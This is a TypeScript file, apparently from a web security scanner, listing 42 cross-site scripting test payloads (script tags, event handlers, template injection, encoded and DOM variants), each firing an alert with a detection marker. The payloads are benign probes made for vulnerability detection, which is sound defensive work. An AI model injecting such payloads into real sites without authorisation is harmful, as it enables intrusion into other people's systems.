/** XSS test payloads — non-destructive detection only */

export interface XSSPayload {
  payload: string;
  marker: string;
  type: 'reflected' | 'dom' | 'event-handler' | 'template';
}

export const XSS_PAYLOADS: XSSPayload[] = [
  // ── Reflected: Basic script injection ─────────────────────────────
  { payload: '<script>alert("secbot-xss-0")</script>', marker: 'secbot-xss-0', type: 'reflected' },
  { payload: '"><script>alert("secbot-xss-1")</script>', marker: 'secbot-xss-1', type: 'reflected' },
  { payload: "'><script>alert('secbot-xss-2')</script>", marker: 'secbot-xss-2', type: 'reflected' },
  { payload: '</script><script>alert("secbot-xss-3")</script>', marker: 'secbot-xss-3', type: 'reflected' },
  { payload: '<script>var x="secbot-xss-4";alert(x)</script>', marker: 'secbot-xss-4', type: 'reflected' },
  { payload: '<ScRiPt>alert("secbot-xss-5")</ScRiPt>', marker: 'secbot-xss-5', type: 'reflected' },
  { payload: '<script/src="data:,alert(\'secbot-xss-6\')"></script>', marker: 'secbot-xss-6', type: 'reflected' },
  { payload: '<script>alert`secbot-xss-7`</script>', marker: 'secbot-xss-7', type: 'reflected' },

  // ── Event handlers ────────────────────────────────────────────────
  { payload: '" onmouseover="alert(\'secbot-xss-8\')"', marker: 'secbot-xss-8', type: 'event-handler' },
  { payload: "' onmouseover='alert(\"secbot-xss-9\")'", marker: 'secbot-xss-9', type: 'event-handler' },
  { payload: '" onfocus="alert(\'secbot-xss-10\')" autofocus="', marker: 'secbot-xss-10', type: 'event-handler' },
  { payload: "' onfocus='alert(\"secbot-xss-11\")' autofocus='", marker: 'secbot-xss-11', type: 'event-handler' },
  { payload: '" onerror="alert(\'secbot-xss-12\')" "', marker: 'secbot-xss-12', type: 'event-handler' },
  { payload: "' onerror='alert(\"secbot-xss-13\")' '", marker: 'secbot-xss-13', type: 'event-handler' },
  { payload: '" onload="alert(\'secbot-xss-14\')"', marker: 'secbot-xss-14', type: 'event-handler' },
  { payload: '" onclick="alert(\'secbot-xss-15\')"', marker: 'secbot-xss-15', type: 'event-handler' },

  // ── IMG/SVG/Body tag injection ────────────────────────────────────
  { payload: '<img src=x onerror="alert(\'secbot-xss-16\')">', marker: 'secbot-xss-16', type: 'event-handler' },
  { payload: '"><img src=x onerror="alert(\'secbot-xss-17\')">', marker: 'secbot-xss-17', type: 'event-handler' },
  { payload: '<svg onload="alert(\'secbot-xss-18\')">', marker: 'secbot-xss-18', type: 'event-handler' },
  { payload: '<svg/onload=alert("secbot-xss-19")>', marker: 'secbot-xss-19', type: 'event-handler' },
  { payload: '<body onload="alert(\'secbot-xss-20\')">', marker: 'secbot-xss-20', type: 'event-handler' },
  { payload: '<details open ontoggle="alert(\'secbot-xss-21\')">', marker: 'secbot-xss-21', type: 'event-handler' },
  { payload: '<video src=x onerror="alert(\'secbot-xss-22\')">', marker: 'secbot-xss-22', type: 'event-handler' },
  { payload: '<audio src=x onerror="alert(\'secbot-xss-23\')">', marker: 'secbot-xss-23', type: 'event-handler' },
  { payload: '<input onfocus="alert(\'secbot-xss-24\')" autofocus>', marker: 'secbot-xss-24', type: 'event-handler' },
  { payload: '<marquee onstart="alert(\'secbot-xss-25\')">', marker: 'secbot-xss-25', type: 'event-handler' },
  { payload: '<iframe src="javascript:alert(\'secbot-xss-26\')">', marker: 'secbot-xss-26', type: 'event-handler' },

  // ── Template injection ────────────────────────────────────────────
  { payload: '{{constructor.constructor("alert(\'secbot-xss-27\')")()}}', marker: 'secbot-xss-27', type: 'template' },
  { payload: '${alert("secbot-xss-28")}', marker: 'secbot-xss-28', type: 'template' },
  { payload: '{{alert("secbot-xss-29")}}', marker: 'secbot-xss-29', type: 'template' },
  { payload: '<%= alert("secbot-xss-30") %>', marker: 'secbot-xss-30', type: 'template' },
  { payload: '#{alert("secbot-xss-31")}', marker: 'secbot-xss-31', type: 'template' },

  // ── Encoding variants ─────────────────────────────────────────────
  { payload: '&lt;script&gt;alert("secbot-xss-32")&lt;/script&gt;', marker: 'secbot-xss-32', type: 'reflected' },
  { payload: '%3Cscript%3Ealert(%22secbot-xss-33%22)%3C%2Fscript%3E', marker: 'secbot-xss-33', type: 'reflected' },
  { payload: '\\x3cscript\\x3ealert("secbot-xss-34")\\x3c/script\\x3e', marker: 'secbot-xss-34', type: 'reflected' },
  { payload: 'javascript:alert("secbot-xss-35")', marker: 'secbot-xss-35', type: 'reflected' },
  { payload: 'data:text/html,<script>alert("secbot-xss-36")</script>', marker: 'secbot-xss-36', type: 'reflected' },

  // ── DOM-centric ───────────────────────────────────────────────────
  { payload: '#<img src=x onerror=alert("secbot-xss-37")>', marker: 'secbot-xss-37', type: 'dom' },
  { payload: '#"><script>alert("secbot-xss-38")</script>', marker: 'secbot-xss-38', type: 'dom' },
  { payload: '#javascript:alert("secbot-xss-39")', marker: 'secbot-xss-39', type: 'dom' },
  { payload: '#\'-alert("secbot-xss-40")-\'', marker: 'secbot-xss-40', type: 'dom' },
  { payload: '#<svg/onload=alert("secbot-xss-41")>', marker: 'secbot-xss-41', type: 'dom' },
];

/**
 * @deprecated Use XSS_PAYLOADS[].marker instead. Kept for backward compatibility.
 */
export const XSS_MARKERS = XSS_PAYLOADS.map(p => p.marker);
